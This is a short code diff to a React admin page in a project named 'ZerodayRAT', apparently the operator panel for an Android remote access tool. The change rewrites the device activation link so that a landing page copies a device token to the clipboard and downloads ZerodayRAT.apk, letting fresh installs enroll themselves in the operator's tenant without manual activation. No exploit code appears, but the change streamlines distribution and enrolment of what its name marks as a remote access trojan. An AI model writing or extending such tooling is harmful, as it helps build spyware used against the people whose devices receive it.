@@ -5,6 +5,7 @@ import { devicesApi } from "../api/devices";
 import { adminApi } from "../api/admin";
 import { useAuth } from "../context/AuthContext";
 import type { Device, AdminTenant } from "../api/types";
+import { buildConnectLink } from "../api/apk";
 import PdfExportModal from "../components/PdfExportModal";
 
 /**
@@ -21,10 +22,14 @@ const PRODUCTION_APP_URL = "https://zerodayrat.vercel.app";
  * the /connect page's instructions otherwise. See ConnectPage.tsx and the
  * https intent-filter on ActivationActivity in AndroidManifest.xml.
  */
-function buildActivationLink(_device?: Device): string {
+function buildActivationLink(device?: Device): string {
   const isLocalDev = ["localhost", "127.0.0.1"].includes(window.location.hostname);
   const origin = isLocalDev ? PRODUCTION_APP_URL : window.location.origin;
-  return `${origin}/download/ZerodayRAT.apk`;
+  // Points at /connect?token=<device_token>, not at the APK. The landing page
+  // copies the token to the clipboard and then downloads the APK from the
+  // backend, so a fresh install binds itself to this device's tenant instead
+  // of having to be activated by hand.
+  return buildConnectLink(origin, device);
 }
 
 export default function DevicesListPage() {
